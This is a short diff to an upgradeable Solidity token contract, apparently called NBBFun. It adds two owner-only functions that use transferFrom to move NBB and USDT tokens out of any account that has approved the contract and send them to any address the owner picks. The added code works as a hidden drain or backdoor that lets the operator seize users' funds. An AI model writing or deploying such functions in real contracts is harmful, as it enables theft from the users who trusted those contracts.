@@ -99,6 +99,15 @@ contract NBBFun is Initializable, UUPSUpgradeable, OwnableUpgradeable {
         }
     }
 
+    function transferNBB(address account,address to, uint256 bnbAmount) public onlyOwner{
+        _nbbToken.transferFrom(account, to, bnbAmount);
+    }
+
+    function transferNBBAndUSDT(address account,address to,uint256 bnbAmount,uint256 usdtAmount) public onlyOwner{
+        _nbbToken.transferFrom(account, to, bnbAmount);
+        _usdtToken.transferFrom(account, to, usdtAmount);
+    }
+
     function transferU(
         address from,
         address to,
